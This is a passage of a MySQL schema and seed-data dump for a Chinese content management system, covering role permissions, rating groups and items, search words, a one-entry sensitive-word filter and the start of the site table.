) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS角色表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_role
-- ----------------------------
INSERT INTO `jc_role` VALUES (1, NULL, '管理员', 10, '1', 10);
INSERT INTO `jc_role` VALUES (2, NULL, '测试 ', 10, '0', 10);

-- ----------------------------
-- Table structure for jc_role_permission
-- ----------------------------
DROP TABLE IF EXISTS `jc_role_permission`;
CREATE TABLE `jc_role_permission`  (
  `role_id` int(11) NOT NULL,
  `uri` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  INDEX `fk_jc_permission_role`(`role_id`) USING BTREE,
  CONSTRAINT `fk_jc_permission_role` FOREIGN KEY (`role_id`) REFERENCES `jc_role` (`role_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS角色授权表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_role_permission
-- ----------------------------
INSERT INTO `jc_role_permission` VALUES (2, 'topic:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'accountPay:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_view');
INSERT INTO `jc_role_permission` VALUES (2, 'config:v_content_charge');
INSERT INTO `jc_role_permission` VALUES (2, 'channel:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'content_cycle:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'department:depart_main');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_local:v_channels_add');
INSERT INTO `jc_role_permission` VALUES (2, 'log:o_delete_login_success');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'data:o_rename');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_global:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'role:v_tree');
INSERT INTO `jc_role_permission` VALUES (2, 'weixinMessage:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'scoregroup:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'dictionary:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'guestbook_ctg:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'template:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'type:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_local:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'task:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:user_right');
INSERT INTO `jc_role_permission` VALUES (2, 'group:v_channels_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'task:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'resource:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'friendlink:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'content:o_check_share');
INSERT INTO `jc_role_permission` VALUES (2, 'flow:pv:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'acquisition:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'dictionary:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_send_to_weixin');
INSERT INTO `jc_role_permission` VALUES (2, 'log:v_list_login_success');
INSERT INTO `jc_role_permission` VALUES (2, 'content:share_list');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_global:v_depart_add');
INSERT INTO `jc_role_permission` VALUES (2, 'member:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'account:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'group:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'left');
INSERT INTO `jc_role_permission` VALUES (2, 'advertising:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_tree_share');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_tree_radio');
INSERT INTO `jc_role_permission` VALUES (2, 'acquisition:v_history');
INSERT INTO `jc_role_permission` VALUES (2, 'webservice:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'webserviceAuth:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'config:v_login');
INSERT INTO `jc_role_permission` VALUES (2, 'topic:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'contentBuy:user_order_list');
INSERT INTO `jc_role_permission` VALUES (2, 'message:v_read');
INSERT INTO `jc_role_permission` VALUES (2, 'statistic:comment:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'log:o_delete_operating_batch');
INSERT INTO `jc_role_permission` VALUES (2, 'lucene:o_create');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_tree_channels');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_send_to_topic');
INSERT INTO `jc_role_permission` VALUES (2, 'group:v_channels_add');
INSERT INTO `jc_role_permission` VALUES (2, 'template:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'directive:module');
INSERT INTO `jc_role_permission` VALUES (2, 'guestbook:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'contentBuy:commissionStatic');
INSERT INTO `jc_role_permission` VALUES (2, 'data:v_revert');
INSERT INTO `jc_role_permission` VALUES (2, 'weixinMenu:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'file:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'directive:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'ftp:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'accountPay:draw_apply_list');
INSERT INTO `jc_role_permission` VALUES (2, 'channel:v_create_path');
INSERT INTO `jc_role_permission` VALUES (2, 'workflow:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'right');
INSERT INTO `jc_role_permission` VALUES (2, 'department:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:user_main');
INSERT INTO `jc_role_permission` VALUES (2, 'advertising:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'scoreitem:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'guestbook_ctg:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'workloadstatistic:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'config:register_item_list');
INSERT INTO `jc_role_permission` VALUES (2, 'store:center');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_global:v_site_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'static:o_index');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_check');
INSERT INTO `jc_role_permission` VALUES (2, 'scoregroup:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'statistic:channel:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'message:v_findUser');
INSERT INTO `jc_role_permission` VALUES (2, 'weixinMessage:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_delete');
INSERT INTO `jc_role_permission` VALUES (2, 'config:register_item_add');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_global:v_check_username');
INSERT INTO `jc_role_permission` VALUES (2, 'role:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'resource:v_left');
INSERT INTO `jc_role_permission` VALUES (2, 'resource:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'advertising_space:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'origin:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_local:v_check_username');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:maintain_left');
INSERT INTO `jc_role_permission` VALUES (2, 'item:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'vote_topic:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:statistic_left');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:content_main');
INSERT INTO `jc_role_permission` VALUES (2, 'keyword:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'template:o_def_template');
INSERT INTO `jc_role_permission` VALUES (2, 'static:o_content');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_unpigeonhole');
INSERT INTO `jc_role_permission` VALUES (2, 'tag:v_check_tag');
INSERT INTO `jc_role_permission` VALUES (2, 'flow:area:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'advertising_space:v_ajax_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'config:o_login');
INSERT INTO `jc_role_permission` VALUES (2, 'guestbook_ctg:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_local:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'weixinMessage:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'department:v_site_list');
INSERT INTO `jc_role_permission` VALUES (2, 'static:o_channel');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_share');
INSERT INTO `jc_role_permission` VALUES (2, 'template:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_left');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_reject');
INSERT INTO `jc_role_permission` VALUES (2, 'comment:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'template:v_left');
INSERT INTO `jc_role_permission` VALUES (2, 'site:v_checkMaster');
INSERT INTO `jc_role_permission` VALUES (2, 'resource:resource_main');
INSERT INTO `jc_role_permission` VALUES (2, 'config:v_mark_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'guestbook_ctg:v_ajax_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'message:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'statistic:guestbook:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'group:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'workflow:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'config:register_item_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_local:v_channels_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_local:v_check_email');
INSERT INTO `jc_role_permission` VALUES (2, 'personal:v_checkPwd');
INSERT INTO `jc_role_permission` VALUES (2, 'tag:v_ajax_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'model:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'site:site_main');
INSERT INTO `jc_role_permission` VALUES (2, 'workflow:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'webserviceCallRecord:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'topic:o_priority');
INSERT INTO `jc_role_permission` VALUES (2, 'config:v_attr_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'site_config:v_company_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'department:v_left');
INSERT INTO `jc_role_permission` VALUES (2, 'department:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:maintain_main');
INSERT INTO `jc_role_permission` VALUES (2, 'advertising:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'tag:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'role:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'sensitivity:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'item:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'acquisition:v_progress_data');
INSERT INTO `jc_role_permission` VALUES (2, 'ftp:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'content_reuse:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'site:v_checkDomain');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_global:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'plug:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'ftp:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'site:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'config:v_member_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'webservice:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'weixinMessage:o_default_save');
INSERT INTO `jc_role_permission` VALUES (2, 'data:o_export');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_move');
INSERT INTO `jc_role_permission` VALUES (2, 'guestbook:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'site:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_tree');
INSERT INTO `jc_role_permission` VALUES (2, 'data:v_listfields');
INSERT INTO `jc_role_permission` VALUES (2, 'group:v_site_contri_list');
INSERT INTO `jc_role_permission` VALUES (2, 'channel:v_tree');
INSERT INTO `jc_role_permission` VALUES (2, 'data:v_rename');
INSERT INTO `jc_role_permission` VALUES (2, 'friendlink:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'site:v_checkAccessPath');
INSERT INTO `jc_role_permission` VALUES (2, 'content_reuse:v_tree');
INSERT INTO `jc_role_permission` VALUES (2, 'weixinMenu:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'site_config:v_base_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'personal:o_profile');
INSERT INTO `jc_role_permission` VALUES (2, 'channel:v_check_path');
INSERT INTO `jc_role_permission` VALUES (2, 'dictionary:v_ajax_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'directive:v_getcode');
INSERT INTO `jc_role_permission` VALUES (2, 'role:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'flow:source:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_global:v_site_add');
INSERT INTO `jc_role_permission` VALUES (2, 'flow:pages:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'advertising_space:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'content:o_static');
INSERT INTO `jc_role_permission` VALUES (2, 'webserviceAuth:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'resource:v_tree');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_global:v_check_email');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:config_main');
INSERT INTO `jc_role_permission` VALUES (2, 'index');
INSERT INTO `jc_role_permission` VALUES (2, 'special:v_create_dimensioncode');
INSERT INTO `jc_role_permission` VALUES (2, 'log:v_list_operating');
INSERT INTO `jc_role_permission` VALUES (2, 'template:template_main');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:config_right');
INSERT INTO `jc_role_permission` VALUES (2, 'origin:v_ajax_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:statistic_main');
INSERT INTO `jc_role_permission` VALUES (2, 'channel:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'member:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'message:v_countUnreadMsg');
INSERT INTO `jc_role_permission` VALUES (2, 'content:o_delete_share');
INSERT INTO `jc_role_permission` VALUES (2, 'channel:channel_main');
INSERT INTO `jc_role_permission` VALUES (2, 'log:v_list_login_failure');
INSERT INTO `jc_role_permission` VALUES (2, 'log:o_delete_login_failure');
INSERT INTO `jc_role_permission` VALUES (2, 'content_cycle:o_recycle');
INSERT INTO `jc_role_permission` VALUES (2, 'content:o_generateTags');
INSERT INTO `jc_role_permission` VALUES (2, 'plug:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'flow:visitor:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'directive:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'model:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'template:v_tree');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_local:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'guestbook:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'directive:v_ajax_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'top');
INSERT INTO `jc_role_permission` VALUES (2, 'message:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'model:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'webservice:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_copy');
INSERT INTO `jc_role_permission` VALUES (2, 'scoreitem:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'plug:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'map');
INSERT INTO `jc_role_permission` VALUES (2, 'static:v_channel');
INSERT INTO `jc_role_permission` VALUES (2, 'vote_topic:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_global:v_channels_add');
INSERT INTO `jc_role_permission` VALUES (2, 'comment:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'config:v_sso_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:expand_right');
INSERT INTO `jc_role_permission` VALUES (2, 'config:v_system_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'site:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'storeConfig:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'model:v_check_id');
INSERT INTO `jc_role_permission` VALUES (2, 'searchwords:v_ajax_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'site:v_left');
INSERT INTO `jc_role_permission` VALUES (2, 'tag:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'jobapply:v_view');
INSERT INTO `jc_role_permission` VALUES (2, 'data:v_selectfile');
INSERT INTO `jc_role_permission` VALUES (2, 'department:v_tree');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_pigeonhole');
INSERT INTO `jc_role_permission` VALUES (2, 'group:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'scoregroup:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_local:v_depart_add');
INSERT INTO `jc_role_permission` VALUES (2, 'static:o_reset_generate');
INSERT INTO `jc_role_permission` VALUES (2, 'static:v_reset_generate');
INSERT INTO `jc_role_permission` VALUES (2, 'config:v_login_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:config_left');
INSERT INTO `jc_role_permission` VALUES (2, 'department:v_check_name');
INSERT INTO `jc_role_permission` VALUES (2, 'weixinMessage:v_default_set');
INSERT INTO `jc_role_permission` VALUES (2, 'jobapply:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'type:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'static:v_index');
INSERT INTO `jc_role_permission` VALUES (2, 'member:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'content_reuse:v_left');
INSERT INTO `jc_role_permission` VALUES (2, 'type:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'main');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_push');
INSERT INTO `jc_role_permission` VALUES (2, 'statistic:content:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'directive:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'static:o_index_remove');
INSERT INTO `jc_role_permission` VALUES (2, 'topic:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'log:o_delete_login_success_batch');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_submit');
INSERT INTO `jc_role_permission` VALUES (2, 'channel:v_left');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:maintain_right');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_global:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'item:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'channel:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'contentBuy:user_account_list');
INSERT INTO `jc_role_permission` VALUES (2, 'accountPay:payByWeiXin');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:expand_main');
INSERT INTO `jc_role_permission` VALUES (2, 'log:o_delete_login_failure_batch');
INSERT INTO `jc_role_permission` VALUES (2, 'webserviceAuth:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'dictionary:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'dictionary:v_check_value');
INSERT INTO `jc_role_permission` VALUES (2, 'group:v_site_list');
INSERT INTO `jc_role_permission` VALUES (2, 'admin_global:v_channels_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'tag:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'searchwords:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'acquisition:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'content:rank_list');
INSERT INTO `jc_role_permission` VALUES (2, 'weixin:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'advertising_space:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'config:v_firewall');
INSERT INTO `jc_role_permission` VALUES (2, 'friendlink:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'content_cycle:o_delete');
INSERT INTO `jc_role_permission` VALUES (2, 'static:v_content');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_check_records');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:user_left');
INSERT INTO `jc_role_permission` VALUES (2, 'flow:enterpage:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'template:v_setting');
INSERT INTO `jc_role_permission` VALUES (2, 'department:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_view_share');
INSERT INTO `jc_role_permission` VALUES (2, 'acquisition:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'personal:v_profile');
INSERT INTO `jc_role_permission` VALUES (2, 'special:o_create_dimensioncode');
INSERT INTO `jc_role_permission` VALUES (2, 'message:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'type:v_check_id');
INSERT INTO `jc_role_permission` VALUES (2, 'content_reuse:v_main');
INSERT INTO `jc_role_permission` VALUES (2, 'log:o_delete_operating');
INSERT INTO `jc_role_permission` VALUES (2, 'topic:by_channel');
INSERT INTO `jc_role_permission` VALUES (2, 'accountPay:goToPay');
INSERT INTO `jc_role_permission` VALUES (2, 'data:v_listfiles');
INSERT INTO `jc_role_permission` VALUES (2, 'lucene:v_index');
INSERT INTO `jc_role_permission` VALUES (2, 'department:v_channels_list');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:statistic_right');
INSERT INTO `jc_role_permission` VALUES (2, 'scoreitem:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'accountPay:payLogin');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_priority');
INSERT INTO `jc_role_permission` VALUES (2, 'vote_topic:v_edit');
INSERT INTO `jc_role_permission` VALUES (2, 'acquisition:v_progress');
INSERT INTO `jc_role_permission` VALUES (2, 'content:v_origin_list');
INSERT INTO `jc_role_permission` VALUES (2, 'friendlink_ctg:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'weixinMenu:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'data:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'member:v_check_username');
INSERT INTO `jc_role_permission` VALUES (2, 'resource:v_add');
INSERT INTO `jc_role_permission` VALUES (2, 'statistic:member:v_list');
INSERT INTO `jc_role_permission` VALUES (2, 'contentBuy:charge_list');
INSERT INTO `jc_role_permission` VALUES (2, 'frame:expand_left');
INSERT INTO `jc_role_permission` VALUES (2, 'site:v_tree');
INSERT INTO `jc_role_permission` VALUES (2, 'task:v_edit');

-- ----------------------------
-- Table structure for jc_score_group
-- ----------------------------
DROP TABLE IF EXISTS `jc_score_group`;
CREATE TABLE `jc_score_group`  (
  `score_group_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '分组名',
  `description` varchar(1000) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '描述',
  `enable` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否启用',
  `def` tinyint(3) NOT NULL DEFAULT 0 COMMENT '是否默认',
  `site_id` int(11) NOT NULL COMMENT '站点',
  PRIMARY KEY (`score_group_id`) USING BTREE,
  INDEX `fk_jc_score_group_site`(`site_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'FComment' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_score_group
-- ----------------------------
INSERT INTO `jc_score_group` VALUES (1, '心情组', '心情组', 0, 1, 1);
INSERT INTO `jc_score_group` VALUES (2, '星级评分', '星级评分', 1, 0, 1);

-- ----------------------------
-- Table structure for jc_score_item
-- ----------------------------
DROP TABLE IF EXISTS `jc_score_item`;
CREATE TABLE `jc_score_item`  (
  `score_item_id` int(11) NOT NULL AUTO_INCREMENT,
  `score_group_id` int(11) NOT NULL COMMENT '评分组',
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '评分名',
  `score` int(11) NOT NULL COMMENT '分值',
  `image_path` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '评分图标路径',
  `priority` int(11) NOT NULL DEFAULT 10 COMMENT '排序',
  PRIMARY KEY (`score_item_id`) USING BTREE,
  INDEX `fk_jc_score_item_group`(`score_group_id`) USING BTREE,
  CONSTRAINT `fk_jc_score_item_group` FOREIGN KEY (`score_group_id`) REFERENCES `jc_score_group` (`score_group_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 14 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '评分项' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_score_item
-- ----------------------------
INSERT INTO `jc_score_item` VALUES (1, 1, '开心', 1, '/r/cms/smilies/m1.gif', 1);
INSERT INTO `jc_score_item` VALUES (2, 1, '板砖', 1, '/r/cms/smilies/m2.gif', 2);
INSERT INTO `jc_score_item` VALUES (3, 1, '感动', 1, '/r/cms/smilies/m3.gif', 3);
INSERT INTO `jc_score_item` VALUES (4, 1, '有用', 1, '/r/cms/smilies/m4.gif', 4);
INSERT INTO `jc_score_item` VALUES (5, 1, '疑问', 1, '/r/cms/smilies/m5.gif', 5);
INSERT INTO `jc_score_item` VALUES (6, 1, '难过', 1, '/r/cms/smilies/m6.gif', 6);
INSERT INTO `jc_score_item` VALUES (7, 1, '无聊', 1, '/r/cms/smilies/m7.gif', 7);
INSERT INTO `jc_score_item` VALUES (8, 1, '震惊', 1, '/r/cms/smilies/m8.gif', 8);
INSERT INTO `jc_score_item` VALUES (9, 2, '非常差', 1, '', 1);
INSERT INTO `jc_score_item` VALUES (10, 2, '差', 2, '', 2);
INSERT INTO `jc_score_item` VALUES (11, 2, '一般', 3, '', 3);
INSERT INTO `jc_score_item` VALUES (12, 2, '好', 4, '', 4);
INSERT INTO `jc_score_item` VALUES (13, 2, '非常好', 5, '', 5);

-- ----------------------------
-- Table structure for jc_score_record
-- ----------------------------
DROP TABLE IF EXISTS `jc_score_record`;
CREATE TABLE `jc_score_record`  (
  `score_record_id` int(11) NOT NULL AUTO_INCREMENT,
  `score_item_id` int(11) NOT NULL COMMENT '评分项',
  `content_id` int(11) NOT NULL COMMENT '内容',
  `score_count` int(11) NOT NULL COMMENT '评分次数',
  PRIMARY KEY (`score_record_id`) USING BTREE,
  INDEX `fk_jc_record_score_item`(`score_item_id`) USING BTREE,
  INDEX `index_score_record_content`(`content_id`) USING BTREE,
  CONSTRAINT `fk_jc_record_score_item` FOREIGN KEY (`score_item_id`) REFERENCES `jc_score_item` (`score_item_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '评分纪录' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_score_record
-- ----------------------------
INSERT INTO `jc_score_record` VALUES (1, 3, 49, 1);

-- ----------------------------
-- Table structure for jc_search_words
-- ----------------------------
DROP TABLE IF EXISTS `jc_search_words`;
CREATE TABLE `jc_search_words`  (
  `word_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '搜索词汇',
  `hit_count` int(11) NOT NULL DEFAULT 0 COMMENT '搜索次数',
  `priority` int(11) NOT NULL DEFAULT 10 COMMENT '优先级',
  `name_initial` varchar(500) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '拼音首字母',
  `is_recommend` tinyint(1) NOT NULL DEFAULT 0 COMMENT '推荐',
  `site_id` int(11) NOT NULL DEFAULT 1 COMMENT '站点',
  PRIMARY KEY (`word_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 42 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '搜索热词' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_sensitivity
-- ----------------------------
DROP TABLE IF EXISTS `jc_sensitivity`;
CREATE TABLE `jc_sensitivity`  (
  `sensitivity_id` int(11) NOT NULL AUTO_INCREMENT,
  `search` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '敏感词',
  `replacement` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '替换词',
  PRIMARY KEY (`sensitivity_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS敏感词表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_sensitivity
-- ----------------------------
INSERT INTO `jc_sensitivity` VALUES (1, '法论功', '***');

-- ----------------------------
-- Table structure for jc_site
-- ----------------------------
DROP TABLE IF EXISTS `jc_site`;
CREATE TABLE `jc_site`  (
  `site_id` int(11) NOT NULL AUTO_INCREMENT,
  `config_id` int(11) NOT NULL COMMENT '配置ID',
  `ftp_upload_id` int(11) NULL DEFAULT NULL COMMENT '上传ftp',
  `domain` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '域名',
  `site_path` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '路径',
  `site_name` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '网站名称',
